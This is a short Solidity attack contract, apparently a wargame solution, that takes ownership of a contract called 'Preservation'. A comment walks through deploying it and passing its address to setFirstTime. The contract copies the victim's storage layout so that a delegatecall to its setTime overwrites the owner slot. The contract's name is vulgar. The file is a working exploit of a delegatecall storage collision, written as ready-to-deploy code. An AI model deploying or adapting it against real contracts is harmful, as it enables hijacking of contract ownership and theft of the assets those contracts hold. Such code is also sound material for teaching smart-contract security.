// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/*

Deploy this contract, then convert the address into 10-based decimal uint.
Pass this uint to contract.setFirstTime(uint). This call will set this contract
as the first storage variable of the vulnerable contract: timeZone1Library.

Since the vulnerable contract calls "setTime" from timeZone1Library through a
delegatecall, we'll be granted the owner role.

Notice how the ordered layout of the state variables are kept the same.

*/
contract PreservationFucker {

  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 

  function setTime(uint _time) public {
    owner = msg.sender;
  }
}
